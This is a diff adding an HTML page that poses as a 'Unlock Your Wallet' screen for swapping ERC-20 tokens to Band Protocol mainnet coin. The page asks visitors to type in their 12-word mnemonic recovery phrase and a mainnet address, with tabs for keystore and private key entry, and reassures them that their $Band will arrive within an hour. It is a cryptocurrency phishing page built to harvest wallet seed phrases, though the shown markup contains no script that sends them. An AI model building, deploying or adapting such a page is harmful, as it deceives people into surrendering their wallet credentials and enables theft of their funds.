@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Mulish:wght@200;300;400;500;600;700&display=swap"
+      rel="stylesheet"
+    />
+    <link
+      rel="stylesheet"
+      href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css"
+      integrity="sha384-JcKb8q3iqJ61gNV9KGb8thSsNjpSL0n8PARn9HuZOnIxN0hoP+VmmDGMN5t9UJ0Z"
+      crossorigin="anonymous"
+    />
+
+    <link rel="stylesheet" href="../css/index.css" />
+    <title>Data</title>
+  </head>
+  <body>
+    <div class="bg-success alert-card text-light p-2 p-md-3">successful</div>
+    <div class="bg-danger alert-card text-light p-2 p-md-3">Error</div>
+    <main>
+      <h4 class="font-weight-bold">Unlock Your Wallet</h4>
+      <div class="card py-4 px-md-4">
+        <div class="text-center links">
+          <a href="/">keystore</a>
+          <a href="./mnemonic.html" class="active">mnemonic</a>
+          <a href="/">private key</a>
+        </div>
+        <form>
+          <h5 class="text-center font-weight-bold my-4">
+            Please enter your 12 word phrase to swap your erc-20 to mainnet coin
+          </h5>
+          <div class="form-group text-center">
+            <textarea class="input"></textarea>
+            <div>
+              <small>Please separate each Mnemonic Phrase with a space.</small>
+            </div>
+          </div>
+          <div class="form-group my-5">
+            <input
+              type="text"
+              class="form-control mx-auto input"
+              id="exampleInputEmail1"
+              aria-describedby="emailHelp"
+              placeholder="Enter your main-net address here"
+              required
+            />
+            <div class="text-center red-text">
+              <small
+                >Swapping your erc-20 tokens to Band Protocol may take up-to 1
+                hour. Kindly exercise patience within this time frame, you will
+                surely get your $Band in the provided wallet</small
+              >
+            </div>
+          </div>
+          <div class="text-center">
+            <button class="w-50 submit">Unlock Wallet</button>
+          </div>
+        </form>
+      </div>
+    </main>
+  </body>
+</html>
